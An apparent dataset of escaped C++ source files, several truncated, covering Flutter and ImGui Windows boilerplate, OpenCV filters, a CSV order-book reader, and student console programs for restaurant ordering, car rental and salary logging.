(!window.Create(L\"newapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<bits/stdc++.h> // STL Headerfile contains most functions\r\n#include<vector>\r\n#include<fstream> \r\n#include<string>\r\nusing namespace std;\r\nstatic int count_orders;\r\nclass Restaurant // Restaurant class created\r\n{\r\n    vector<string> dish_names; //Vectors for bill generation\r\n    vector<int> quantity; \r\n    vector<int> costs;\r\n    int choice_menu,exit;\r\n    string menu_items[7]={\"Pizza\",\"Burger\",\"Sandwich\",\"Rolls\",\"Beverages\",\"Desserts\",\"Soups\"}; //Array\r\n    string name;\r\n    int final_cost;\r\n    char email_address[20];\r\n    public:\r\n    Restaurant()\r\n    {\r\n    cout<<\"\\t\\t\\t----------Flavourozo-----------\\n\\n\";\r\n    cout<<\"\\t\\t\\t    Welcome to our Restro\"<<endl;\r\n    cout<<\"\\t\\t*******  Big City Variety, Small Town Price  *******\"<<endl;\r\n    cout<<\"Hello, What would you like to order?\\n\\n\";\r\n    menu();\r\n    }\r\n    void menu()\r\n    {\r\n    count_orders=0;\r\n    cout<<\"\\t\\t\\t\\t--------Menu--------\\n\\n\";\r\n    for(int i=0; i<(sizeof(menu_items)/sizeof(menu_items[0]));i++)\r\n    {\r\n        cout<<i+1<<\") \"<<menu_items[i]<<endl;\r\n    }\r\n    cout<<\"\\nPlease Enter your Choice: \";\r\n\tcin>>choice_menu;\r\n    choice_menu;\r\n    select_menu();\r\n    }\r\n    void select_menu()\r\n    {\r\n        switch(choice_menu)\r\n        {\r\n            case 1:\r\n                Pizza();\r\n                break;\r\n            case 2:\r\n                Burger();\r\n                break;\r\n            case 3:\r\n                sandwich();\r\n                break;\r\n            case 4:\r\n                Rolls();\r\n                break;\r\n            case 5:\r\n                Beverage();\r\n                break;\r\n            case 6:\r\n                Desserts();\r\n                break;\r\n            case 7:\r\n                Soups();\r\n                break;\r\n            default:\r\n                cout<<\"\\nPlease select from the options available.\";\r\n                cout<<\"\\nPress 1 to try again.\\nPress 2 to Exit\";\r\n                cin>>exit;\r\n                if(exit==1)\r\n                    Restaurant();\r\n                else\r\n                    return;\r\n        }\r\n\r\n    }\r\n    void Soups()\r\n    {\r\n        int select_Soups,select_Soups_size,Soups_num;\r\n        string Soups[]={\"Tomato Soup\",\"Veg Manchao\",\"Hot-n-Sour Soup\",\"Sweet Corn Veg Soup\",\"TummYum Soup\",\"Lemon Coriender Soup\"};\r\n        int Soups_cost[]={90,110,110,120,120,130};\r\n        for(int i=0; i<(sizeof(Soups_cost)/sizeof(Soups_cost[0]));i++)\r\n        {\r\n            cout<<\"\\n\"<<left<<i+1<<\".  \"<<setw(50)<<Soups[i]<<setw(70)<<Soups_cost[i];\r\n        }   \r\n        cout<<\"\\n\\nSelect your Soup from Above : \";\r\n        cin>>select_Soups;\r\n        cout<<\"\\nSelect size for Soup : \\n1. Small\\n2. Medium\\n3. Large \\n\";\r\n        cout<<\"\\nPlease select from the options available. : \";\r\n        cin>>select_Soups_size;\r\n        cout<<\"\\nYour Soups is : \"<<Soups[select_Soups-1]<<endl;\r\n        cout<<\"\\nEnter the number of Bowl : \";\r\n        cin>>Soups_num;\r\n        cout<<\"Final Cost After Selection of Size : \"<<size_all(select_Soups_size,Soups_cost[select_Soups-1])*Soups_num;\r\n        dish_names.push_back(Soups[select_Soups-1]);\r\n        costs.push_back(size_all(select_Soups_size,Soups_cost[select_Soups-1])*Soups_num);\r\n        quantity.push_back(Soups_num);\r\n        ++count_orders;\r\n        repeat();\r\n\r\n    }\r\n    void Desserts()\r\n    {\r\n        int select_Desserts,select_Desserts_size,Desserts_num;\r\n        string Desserts[]={\"Chocolate Ice-Cream\",\"Butter-Scotch Ice-Cream\",\"Vanilla  Ice-Cream\",\"Pastry\",\"Custard\",\"Gulab Jamun with Ice-Cream\"};\r\n        int Desserts_cost[]={60,70,60,100,70,100};\r\n        for(int i=0; i<(sizeof(Desserts_cost)/sizeof(Desserts_cost[0]));i++)\r\n        {\r\n            cout<<\"\\n\"<<left<<i+1<<\".  \"<<setw(50)<<Desserts[i]<<setw(70)<<Desserts_cost[i];\r\n        }   \r\n        cout<<\"\\n\\nSelect your Desserts from Above : \";\r\n        cin>>select_Desserts;\r\n        cout<<\"\\nYour Desserts is : \"<<Desserts[select_Desserts-1]<<endl;\r\n        cout<<\"\\nEnter the number of Desserts : \";\r\n        cin>>Desserts_num;\r\n        cout<<\"Final Cost After Selection of Size : \"<<Desserts_cost[select_Desserts-1]*Desserts_num;\r\n        dish_names.push_back(Desserts[select_Desserts-1]);\r\n        costs.push_back(Desserts_cost[select_Desserts-1]*Desserts_num);\r\n        quantity.push_back(Desserts_num);\r\n        ++count_orders;\r\n        repeat();\r\n\r\n    }\r\n    void Beverage()\r\n    {\r\n        int select_Beverage,select_Beverage_size,Beverage_num;\r\n        string Beverage[]={\"Cold Drink 750ml\",\"Cold Coffe With Ice-Cream\",\"Mint Mojito\",\"Pink Tango\",\"Butter Scotch Shake\",\"Juice\"};\r\n        int Beverage_cost[]={60,120,150,150,120,100};\r\n        for(int i=0; i<(sizeof(Beverage_cost)/sizeof(Beverage_cost[0]));i++)\r\n        {\r\n            cout<<\"\\n\"<<left<<i+1<<\".  \"<<setw(50)<<Beverage[i]<<setw(70)<<Beverage_cost[i];\r\n        }   \r\n        cout<<\"\\n\\nSelect your Beverage from Above : \";\r\n        cin>>select_Beverage;\r\n        cout<<\"\\nYour Beverage is : \"<<Beverage[select_Beverage-1]<<endl;\r\n        cout<<\"\\nEnter the nu",
    "\n/*\n  Tejasri Kasturi & Veditha Gudapati\n  01/26/2024\n  Spring 2024\n  CS 5330 Computer Vision\n\n  Functions for image manipulation\n*/\n\n#include <opencv2/opencv.hpp>\n#include \"filter.hpp\"\n#include <algorithm>\n#include <cmath>\n\n\n/*void displayBalloon(cv::Mat& frame, int x, int y) {\n    // Add your code to display a balloon on the frame at the specified (x, y) position\n    // You can draw a circle or any other shape to represent the balloon\n    cv::circle(frame, cv::Point(x, y), 20, cv::Scalar(0, 255, 255), -1); // Yellow balloon with a radius of 20\n}*/\n\n\n\n\n// Function to apply an emboss effect to an image.\nint embossEffect(cv::Mat &src, cv::Mat &dst)\n{\n    if (src.empty())\n    {\n        std::cerr << \"Source image is empty\\n\"; // Print an error message if the source image is empty.\n        return -1;                              // Return -1 if the source image is empty.\n    }\n\n    cv::Mat sobelX, sobelY;\n    sobelX3x3(src, sobelX); // Apply Sobel X filter.\n    sobelY3x3(src, sobelY); // Apply Sobel Y filter.\n\n    cv::Mat direction = (cv::Mat_<float>(1, 2) << 0.7071, 0.7071); // Create a direction vector.\n\n    // Compute the dot product of Sobel X and Sobel Y with the direction vector\n    cv::Mat embossImage = sobelX.mul(direction.at<float>(0)) + sobelY.mul(direction.at<float>(1)); // Compute the emboss effect.\n\n    // Adjust the result to be in the range [0, 255]\n    embossImage = embossImage + 128;                                  // Offset by 128 to ensure values are non-negative\n    cv::normalize(embossImage, embossImage, 0, 255, cv::NORM_MINMAX); // Normalize the emboss image.\n\n    // Convert to 8-bit unsigned integer\n    embossImage.convertTo(dst, CV_8U); // Convert the embossed image to 8-bit unsigned integer.\n\n    return 0; // Indicate success\n}\n\n// Function to blur and quantize an image.\nint blurQuantize(cv::Mat &src, cv::Mat &dst, int levels)\n{\n    if (src.empty())\n    {\n        std::cerr << \"Source image is empty\\n\"; // Print an error message if the source image is empty.\n        return -1;\n    }\n\n    // Blur the image using existing blur function\n    cv::Mat blurredImage;\n    blur5x5_1(src, blurredImage); // Apply blur to the image.\n\n    // Quantize the image\n    dst.create(src.size(), src.type()); // Create the output image.\n\n    // Calculate the size of a bucket\n    float bucketSize = 255.0 / levels;\n\n    for (int y = 0; y < src.rows; ++y)\n    {\n        for (int x = 0; x < src.cols; ++x)\n        {\n            for (int c = 0; c < src.channels(); ++c)\n            {\n                // Quantize each color channel\n                float originalValue = blurredImage.at<cv::Vec3b>(y, x)[c];\n                int quantizedValue = static_cast<int>(originalValue / bucketSize) * bucketSize; // Calculate the quantized value.\n\n                // Update the destination image\n                dst.at<cv::Vec3b>(y, x)[c] = static_cast<uchar>(quantizedValue); // Update the pixel value in the output image.\n            }\n        }\n    }\n\n    return 0; // Indicate success\n}\n\n// Function to compute the magnitude of gradients from Sobel X and Sobel Y images.\nint magnitude(cv::Mat &sx, cv::Mat &sy, cv::Mat &dst)\n{\n    // Create the destination matrix with the same size as Sobel X and Sobel Y\n    dst.create(sx.size(), CV_16SC3); // Initialize the destination image with the same size as Sobel X and Sobel Y.\n\n    // Loop over each row in the images\n    for (int i = 0; i < sx.rows; i++)\n    {\n        // Get pointers to the current row in Sobel X, Sobel Y, and the destination matrices\n        cv::Vec3s *xptr = sx.ptr<cv::Vec3s>(i);  // Pointer to the current row in Sobel X.\n        cv::Vec3s *yptr = sy.ptr<cv::Vec3s>(i);  // Pointer to the current row in Sobel Y.\n        cv::Vec3s *dptr = dst.ptr<cv::Vec3s>(i); // Pointer to the current row in the destination image.\n\n        // Loop over each column in the images\n        for (int j = 0; j < sx.cols; j++)\n        {\n            // Loop over each channel (R, G, B) in the images\n            for (int k = 0; k < sx.channels(); k++)\n            {\n                // Calculate the Euclidean distance for each channel\n                dptr[j][k] = sqrt((xptr[j][k] * xptr[j][k]) + (yptr[j][k] * yptr[j][k])); // Calculate the magnitude.\n            }\n        }\n    }\n\n    return 0; // Return 0 to indicate success.\n}\n\n// Function to apply a 3x3 Sobel X filter to an image.\nint sobelX3x3(cv::Mat& src, cv::Mat& dst) {\n\n    //allocate dst image\n    dst = cv::Mat::zeros(src.size(), CV_16SC3); //signed short data type \n    cv::Mat temp_h = cv::Mat::zeros(src.size(), CV_16SC3); //signed short data type \n    //loop over src and apply a 3x3 filter\n    for (int i = 1; i < src.rows - 1; i++) {\n\n        //src pointer\n        cv::Vec3b* rptr = src.ptr<cv::Vec3b>(i);\n        //destination pointer\n        cv::Vec3s* dptr = temp_h.ptr<cv::Vec3s>(i);\n        //for each column \n        for (int j = 1; j < src.cols - 1; j++) {\n            //for each color channel \n            for (int c = 0; c < 3; c++) {\n        ",
    "#include \"CSVReader.h\"\n#include <iostream>\n#include <fstream>\n\nCSVReader::CSVReader()\n{\n\n}\n\nstd::vector<OrderBookEntry> CSVReader::readCSV(std::string csvFilename)\n{\n    std::vector<OrderBookEntry> entries;\n\n    std::ifstream csvFile{csvFilename};\n    std::string line;\n    if (csvFile.is_open())\n    {\n        while(std::getline(csvFile, line))\n        {\n            try {\n                OrderBookEntry obe = stringsToOBE(tokenise(line, ','));\n                entries.push_back(obe);\n            }catch(const std::exception& e)\n            {\n                //std::cout << \"CSVReader::readCSV bad data\"  << std::endl;\n            }\n        }// end of while\n    }    \n\n    std::cout << \"CSVReader::readCSV read \" << entries.size() << \" entries\"  << std::endl;\n    return entries; \n}\n\nstd::vector<std::string> CSVReader::tokenise(std::string csvLine, char separator)\n{\n   std::vector<std::string> tokens;\n   signed int start, end;\n   std::string token;\n    start = csvLine.find_first_not_of(separator, 0);\n    do{\n        end = csvLine.find_first_of(separator, start);\n        if (start == csvLine.length() || start == end) break;\n        if (end >= 0) token = csvLine.substr(start, end - start);\n        else token = csvLine.substr(start, csvLine.length() - start);\n        tokens.push_back(token);\n    start = end + 1;\n    }while(end > 0);\n\n   return tokens; \n}\n\nOrderBookEntry CSVReader::stringsToOBE(std::vector<std::string> tokens)\n{\n    double price, amount;\n\n    if (tokens.size() != 5) // bad\n    {\n        //std::cout << \"Bad line \" << std::endl;\n        throw std::exception{};\n    }\n    // we have 5 tokens\n    try {\n         price = std::stod(tokens[3]);\n         amount = std::stod(tokens[4]);\n    }catch(const std::exception& e){\n        std::cout << \"Bad float! \" << tokens[3]<< std::endl;\n        std::cout << \"Bad float! \" << tokens[4]<< std::endl; \n        throw;        \n    }\n\n    OrderBookEntry obe{price, \n                        amount, \n                        tokens[0],\n                        tokens[1], \n                        OrderBookEntry::stringToOrderBookType(tokens[2])};\n\n    return obe; \n}\n      \n",
    "#include<iostream>\n#include<conio.h>\n#include<string>\n\n\tusing namespace std;\n\nstatic int maxp = 100;\nstatic int maxd = 50;\nstatic int maxe = 50;\n\nclass customer\n{\n\tint user_id;\n\tint len;\n\tchar contact[10];\n\tstring name;\n\npublic:\n\tvoid customer_data()\n\t{\n\t\tcout << \"\\nEnter following details\" << endl;\n\t\tcout << \"Enter your Name: \";\n\t\tcin >> name;\n\t\tcout << \"Enter User Id: \";\n\t\tcin >> user_id;\n\t\tcout << \"Enter Contact: \";\n\t\tcin >> contact;\n\t\tlen = strlen(contact);\n\t\tif (len != 10)\n\t\t{\n\t\t\tcout << \"\\nInvalid Number\\n\";\n\n\t\t}\n\t}\n\n\tvoid display_user();\n};\n\nvoid customer::display_user()\n{\n\tcout << \"Name: \" << name << endl;\n\tcout << \"User-Id: \" << user_id << endl;\n\tcout << \"Contact: \" << contact << endl << endl;\n}\n\nclass car\n{\nprotected:\n\tstring car_type;\n\tint days;\n\npublic:\n\tvoid car_data()\n\t{\n\t\tcout << \"Enter number of days for rent: \";\n\t\tcin >> days;\n\t}\n};\n\nclass EV : virtual public car\n{\nprotected:\n\tint model1;\n\tint a;\n\npublic:\n\n\tvoid display_ev()\n\t{\n\n\t\tcout << \"\\nEnter 1 for Tata Nexon EV Max\" << endl;\n\t\tcout << \"Enter 2 for Kia EV 6\" << endl;\n\t\tcout << \"Choose car model: \";\n\t\tcin >> model1;\n\t\tif (model1 == 1)\n\t\t{\n\t\t\tcout << \"\\nCar selected: Tata Nexon EV Max\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"\\nCar selected: Kia EV 6\";\n\t\t}\n\t\tprice();\n\t}\n\n\tint price() //function overloading\n\t{\n\t\ta = 80 * days;\n\t\treturn a;\n\t}\n};\n\nclass petrol :virtual public car\n{\nprotected:\n\tint model2;\n\tfloat b;\n\npublic:\n\tvoid display_p()\n\t{\n\t\tcout << \"\\nEnter 1 for Hyundai Sentro MT\" << endl;\n\t\tcout << \"Enter 2 for Maruti Alto K10\" << endl;\n\t\tcout << \"Choose car model: \";\n\t\tcin >> model2;\n\t\tif (model2 == 1)\n\t\t{\n\t\t\tcout << \"\\nCar selected: Hyundai Sentro MT\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"\\nCar selected: Maruti Alto K10\";\n\n\t\t}\n\t\tprice();\n\t}\n\n\tfloat price() //function overloading\n\t{\n\t\tb = 100 * days;\n\n\n\t\treturn b;\n\t}\n};\n\nclass diesel : virtual public car\n{\nprotected:\n\tint model3;\n\tdouble c;\n\npublic:\n\tvoid display_d()\n\t{\n\t\tcout << \"\\nEnter 1 for Mahindra Marazzo\" << endl;\n\t\tcout << \"Enter 2 for Toyoto Innova Crysta\" << endl;\n\t\tcout << \"Choose car model: \";\n\t\tcin >> model3;\n\t\tif (model3 == 1)\n\t\t{\n\t\t\tcout << \"\\nCar selected: Mahindra Marazzo\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"\\nCar selected: Toyoto Innova Crysta\";\n\t\t}\n\t\tprice();\n\t}\n\n\tdouble price() //function overloading\n\t{\n\t\tc = 90.44 * days;\n\t\treturn c;\n\t}\n};\n\nclass capacity   //operator overloading\n{\n\npublic:\n\tvoid operator--()\n\t{\n\t\tmaxp--;\n\t}\n\tvoid operator-()\n\t{\n\t\tmaxd--;\n\t}\n\tvoid operator+()\n\t{\n\t\tmaxe--;\n\t}\n\tvoid capp()\n\t{\n\t\tcout << \"\\n\\nPetrol Vehicle Left:  \" << maxp;\n\t\tcout << \"\\nDiesel Vehicle Left:  \" << maxd;\n\t\tcout << \"\\nElectric Vehicle Left:  \" << maxe;\n\t}\n};\n\nclass reservation : public EV, public petrol, public diesel, public customer, public capacity\n{\nprotected:\n\tcapacity c1, c2, c3;\n\tdouble total_price;\n\tint ch;\n\tstring choice;\n\tint  rent_fee = 500;\n\npublic:\n\tvoid get_car()\n\t{\n\t\tcout << \"\\nEnter 1 for Petrol Car\" << endl;\n\t\tcout << \"Enter 2 for Electric vehical\" << endl;\n\t\tcout << \"Enter 3 for Diesel Car\" << endl;\n\t\tcout << \"Choose Car Type : \";\n\t\tcin >> ch;\n\n\t\tswitch (ch)\n\t\t{\n\t\tcase 1:\n\n\t\t\tdisplay_p();\n\t\t\tconfirm();\n\t\t\tcout << \"\\nYour Car is Booked\\n\";\n\t\t\tdisplay_car();\n\t\t\t--c1;\n\t\t\t//capp();\n\t\t\tbreak;\n\n\t\tcase 2:\n\t\t\tdisplay_ev();\n\t\t\tconfirm();\n\t\t\tcout << \"\\nYour Car is Booked\\n\";\n\t\t\tdisplay_car();\n\t\t\t+c2;\n\t\t\t//capp();\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tdisplay_d();\n\t\t\tconfirm();\n\t\t\tcout << \"\\nYour Car is Booked\\n\";\n\t\t\tdisplay_car();\n\t\t\t-c3;\n\t\t\t//capp();\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tcout << \"\\nInvalid\" << endl;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tvoid calc()\n\t{\n\t\tif (ch == 1)\n\t\t{\n\t\t\ttotal_price = rent_fee + b;\n\n\t\t}\n\t\telse if (ch == 2)\n\t\t{\n\t\t\ttotal_price = rent_fee + a;\n\t\t}\n\t\telse if (ch == 3)\n\t\t{\n\t\t\ttotal_price = rent_fee + c;\n\t\t}\n\t}\n\n\tstring confirm()\n\t{\n\t\tcout << \"\\n\\nAre you sure, you want to rent this car?\" << endl << \"Enter YES to continue or NO to exit\" << endl;\n\t\tcin >> choice;\n\t\tif (choice == \"YES\" || choice == \"yes\")\n\t\t{\n\t\t\tcalc();\n\t\t\treturn \"booked\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn \"Exit\";\n\n\t\t}\n\t}\n\n\tvoid display_car()\n\t{\n\t\tcout << endl << endl;\n\t\tcout.width(60);\n\t\tcout.fill('-');\n\t\tcout << \"BILL\";\n\t\tcout.width(60);\n\t\tcout.fill('-');\n\t\tcout << \"-\";\n\n\t\tdisplay_user();\n\n\t\tcout << endl;\n\t\tcout << \"Car chosen: \" << endl;\n\t\tif (ch == 1)\n\t\t{\n\t\t\tcout << \"Car type: Petrol\" << endl;\n\t\t\tcout << \"Model:\";\n\n\t\t\tif (model2 == 1)\n\t\t\t{\n\t\t\t\tcout << \"Hyundai Sentro MT\" << endl << endl;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Maruti Alto K10\" << endl << endl;\n\t\t\t}\n\t\t\tcout << \"Number of days of rent: \" << days << endl << endl;\n\t\t\tcout << \"Total Amount : \" << total_price;\n\t\t}\n\t\telse if (ch == 2)\n\t\t{\n\t\t\tcout << \"Car type: EV\" << endl;\n\t\t\tcout << \"Model: \";\n\n\t\t\tif (model1 == 1)\n\t\t\t{\n\t\t\t\tcout << \"Tata Nexon EV Max\" << endl << endl;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Kia EV 6\" << endl << endl;\n\t\t\t}\n\t\t\tcout << \"Number of days of rent: \" << days << endl << endl;\n\t\t\tcout << \"Total Amount : \" << total_price;\n\n\t\t}\n\t\telse if (ch == 3)\n\t\t{\n\t\t\tcout << \"Car type : Diesel \" << endl;\n\t\t\tcout << \"Model: \";\n\t\t\tif (model3 == 1)\n\t\t\t{\n\t\t\t\tcout << \"Mahindra Marazzo\" << endl << en",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"namer_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host windo doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1).\n//  2021-03-23: Inputs: Clearing keyboard down array when losing focus (WM_KILLFOCUS).\n//  2021-02-18: Added ImGui_ImplWin32_EnableAlphaCompositing(). Non Visual Studio users will need to link with dwmapi.lib (MinGW/gcc: use -ldwmapi).\n//  2021-02-17: Fixed ImGui_ImplWin32_EnableDpiAwareness() attempting to get SetProcessDpiAwareness from shcore.dll on Windows 8 whereas it is only supported on Windows 8.1.\n//  2021-01-25: Inputs: Dynamically loading XInput DLL.\n//  2020-12-04: Misc: Fixed setting of io.DisplaySize to invalid/uninitialized data when after hwnd has been closed.\n//  2020-03-03: Inputs: Calling AddInputCharacterUTF16() to support surrogate pairs leading to codepoint >= 0x10000 (for more complete CJK inputs)\n//  2020-02-17: Added ImGui_ImplWin32_EnableDpiAwareness(), ImGui_ImplWin32_GetDpiScaleForHwnd(), ImGui_ImplWin32_GetDpiScaleForMonitor() helper functions.\n//  2020-01-14: Inputs: Added support for #define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD/IMGUI_IMPL_WIN32_DISABLE_LINKING_XINPUT.\n//  2019-12-05: Inputs: Added support for ImGuiMouseCursor_NotAllowed mouse cursor.\n//  2019-05-11: Inputs: Don't filter value from WM_CHAR before calling AddInputCharacter().\n//  2019-01-17: Misc: Using GetForegroundWindow()+IsChild() instead of GetActiveWindow() to be compatible with windows created in a different thread or parent.\n//  2019-01-17: Inputs: Added support for mouse buttons 4 and 5 via WM_XBUTTON* messages.\n//  2019-01-15: Inputs: Added support for XInput gamepads (if ImGuiConfigFlags_NavEnableGamepad is set by user application).\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when ",
    "#include <iostream>\n#include <string>\n#include <memory>\n\n#include \"job.hpp\"\n#include \"../bank.hpp\"\n\nstd::ofstream File(\"salary.db\", std::ios::app);\n\nvoid PAY(double salary){       \n        int pay = 5;\n        \n        std::cout << \"\\nReceiving salary, hold on...\\n\\n\";\n        \n        std::chrono::milliseconds duration(1000 * pay);\n        \n        std::this_thread::sleep_for(duration);\n        \n        std::string _salary = CONVERT(salary);\n        \n        File <<  \"Salary: \u20a6\" << _salary << std::endl;\n        \n        std::cout << \"Received!\\n\";\n}\n\nint main(){\n    \n    \n    std::string name;\n    std::cout << \"Enter you name: \";\n    getline(std::cin, name);\n    \n    std::string field;\n    std::cout << \"What field do you major in? \";\n    getline(std::cin, field);\n    \n    std::string job_title;\n    std::cout << \"Your job title? \";\n    getline(std::cin, job_title);\n    \n    double salary = Input<double>(\"The numerical value of your salary? \");\n    while(salary < 0){\n        std::cout << \"Salary cannot be negative!\" << std::endl;        \n        salary = Input<double>(\"The numerical value of your salary? \");\n    }\n    \n    std::cout << std::endl;\n    \n    std::unique_ptr<Job> job = std::make_unique<Job>(field, job_title, salary);\n    \n    std::unique_ptr<Person> person = std::make_unique<Person>(name, *job);\n    person -> description();\n    \n    PAY(salary);\n}",
    "\ufeff#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <cmath>\n#include <QPainterPath>\n#include <QPainter>\n#include <QPen>\n#include \"poland.h\"\n#include <QChar>\n#include <QPoint>\nMainWindow::MainWindow(QWidget *parent) :\n    QMainWindow(parent),\n    ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    button = new QPushButton(this);\n    button->setGeometry(width() - 105, 5, 100, 50);\n    button->setText(\"build\");\n    connect(button, SIGNAL(clicked()), this, SLOT(myClicked()));\n\n\n}\n\nvoid MainWindow::myClicked(){\n    ui->label->setGeometry(5, 5, width() - 115, height() - 10);\n    QPixmap pm(width() - 115, height() - 10);\n    pm.fill(Qt::darkCyan);\n    QString xmi = ui->lineEdit->text();\n    QString xmx = ui->lineEdit_3->text();\n    QString ymi = ui->lineEdit_6->text();\n    QString ymx = ui->lineEdit_5->text();\n    double xmin = xmi.toDouble();\n    double xmax = xmx.toDouble();\n    double ymin = ymi.toDouble();\n    double ymax = ymx.toDouble();\n    QString n = ui->lineEdit_2->text();\n    double x, y;\n    double ans = 0;\n    int xgmin = 0, xgmax = pm.width();\n    int ygmin = 0, ygmax = pm.height();\n    x = xmin;\n    double step = (xmax - xmin) / (xgmax - xgmin);\n    double kx = (xgmax - xgmin) / (xmax - xmin);\n    double ky = (ygmin - ygmax) / (ymax - ymin);\n    double xn, yn;\n    xn = xgmin - kx * xmin;\n    yn = ygmin - ky * ymax;\n    QPainterPath path;\n    QPainter painter;\n    painter.begin(&pm);\n    x = xmin;\n    n.replace('x', \"(\" + QString::number(x) +\")\");\n    calc(n.toStdString(), ans);\n    y = ans;\n    QPen pen;\n    QPen peno;\n    pen.setWidth(1);\n    peno.setColor(Qt::lightGray);\n    peno.setWidth(1);\n    painter.setPen(peno);\n    painter.drawLine(0, yn, xgmax, yn);\n    painter.drawLine(xn, 0, xn, ygmax);\n    painter.setPen(pen);\n    double xg = xgmin + kx * (x - xmin);\n    double yg = ygmin + ky * (y - ymax);\n    path.moveTo(xg, yg);\n    for(int i = xgmin; i < xgmax; i ++){\n        double yold = y;\n        x += step;\n        if(x >= xmax){\n            break;\n        }\n        QString n = ui->lineEdit_2->text();\n        n.replace('x', \"(\" + QString::number(x) +\")\");\n        ans = 0;\n        calc(n.toStdString(), ans);\n        y = ans;\n        xg = xgmin + kx * (x - xmin);\n        yg = ygmin + ky * (y - ymax);\n        if(yold < ymin or yold > ymax){\n            path.moveTo(xg, yg);\n\n        }else{\n            path.lineTo(xg, yg);\n        }\n    }\n    painter.drawPath(path);\n    